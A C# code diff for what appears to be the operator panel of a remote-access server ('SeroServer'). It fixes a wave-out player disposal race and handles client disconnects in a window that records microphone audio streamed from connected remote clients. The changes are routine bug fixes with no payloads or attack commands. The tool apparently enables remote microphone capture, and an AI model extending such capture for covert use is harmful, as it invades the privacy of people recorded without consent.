@@ -176,7 +176,7 @@ internal sealed class WaveOutPlayer : IDisposable
         _disposed = true;
         _running = false;
         _queue.CompleteAdding();
-        if (disposing) _thread.Join(2000);
+        _thread.Join(disposing ? 2000 : 500); // always join — waveOutClose must not race waveOutReset
         if (_open) { waveOutClose(_hwo); }
         if (_hEvent != IntPtr.Zero) CloseHandle(_hEvent);
     }
@@ -218,6 +218,7 @@ public partial class MicrophoneWindow : ThemedWindow
 
         _server.RegisterHandler(clientId, PacketType.MicDevicesResult, OnDevices);
         _server.RegisterHandler(clientId, PacketType.MicData,          OnAudioChunk);
+        _server.ClientDisconnected += OnClientDisconnected;
 
         _recTimer.Tick  += (_, _) => { _recSeconds++; TxtRecTime.Text = $"{_recSeconds / 60}:{_recSeconds % 60:D2}"; };
         _waveTimer.Tick += (_, _) => DrawWaveform();
@@ -230,6 +231,7 @@ public partial class MicrophoneWindow : ThemedWindow
             _waveTimer.Stop();
             _server.UnregisterHandler(clientId, PacketType.MicDevicesResult);
             _server.UnregisterHandler(clientId, PacketType.MicData);
+            _server.ClientDisconnected -= OnClientDisconnected;
             if (_recording) SendStop();
             _player?.Dispose();
             _player = null;
@@ -333,10 +335,27 @@ public partial class MicrophoneWindow : ThemedWindow
         TxtStatus.Text = string.Format(Lang.Get("MIC_STOPPED"), (total / (SampleRate * Channels * 2.0)).ToString("F1"), _chunks.Count);
     }
 
-    private async void SendStop()
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
     {
-        await _server.SendToClient(_clientId, new Packet { Type = PacketType.MicStop });
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            if (_recording)
+            {
+                _recording = false;
+                _recTimer.Stop();
+                _waveTimer.Stop();
+                _player?.Dispose(); _player = null;
+                RecordingIndicator.Visibility = Visibility.Collapsed;
+                BtnRecord.IsEnabled = true;
+                BtnStop.IsEnabled   = false;
+            }
+            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
+        });
     }
+
+    private void SendStop()
+        => _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.MicStop });
 
     private async void SaveWav_Click(object s, RoutedEventArgs e)
     {
